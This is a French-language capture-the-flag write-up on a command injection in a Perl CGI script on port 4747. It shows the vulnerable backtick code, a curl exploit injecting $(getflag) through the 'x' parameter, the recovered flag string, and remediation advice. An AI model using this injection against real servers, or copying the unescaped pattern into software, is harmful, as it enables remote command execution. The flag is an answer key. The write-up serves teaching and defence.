# Rapport de Vulnérabilité : Injection de commande dans un script Perl via un paramètre non filtré

## Description

Dans ce niveau, un script Perl accessible sur le port `4747` contient une faille critique d’exécution de commande. Le paramètre `x`, passé via une requête HTTP, est directement injecté dans une commande système sans aucun filtrage. Cela permet à un attaquant d’exécuter arbitrairement des commandes sur le système via une simple requête `curl`.

## Comment Exploiter la Faille

### Étape 1 : Analyse du script Perl

Contenu du script `level04.pl` :

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Le script récupère le paramètre `x` et l’insère directement dans une commande système `echo`, sans échappement ni validation.

### Étape 2 : Compréhension de la faille

La ligne vulnérable est :

```perl
print `echo $y 2>&1`;
```

En Perl, les backticks (`` ` ``) exécutent une commande système.

curl 'localhost:4747?x=$(getflag)'

### Étape 4 : Récupération du flag

Le flag est affiché directement dans la réponse HTTP :

```
ne2searoevaevoem4ov4ar8ap
```

---

## Comment Résoudre la Faille

Pour corriger cette vulnérabilité :

* **Ne jamais exécuter directement des entrées utilisateur** dans des appels système (\`\`, system(), exec()…).
* **Utiliser des fonctions sécurisées** : En Perl, il est préférable d’utiliser des appels à des commandes avec des listes, ou mieux, d’éviter complètement l’exécution de commandes système.
* **Filtrer et échapper tous les paramètres** : Valider le contenu attendu (liste blanche) avant tout traitement.

## Conclusion

Cette faille classique d'injection de commande permet à un attaquant d’exécuter arbitrairement des commandes sur le système à distance, via un simple paramètre HTTP. Ce genre d’erreur illustre l’importance de **ne jamais faire confiance à une entrée utilisateur**, même dans un script local ou interne.

---
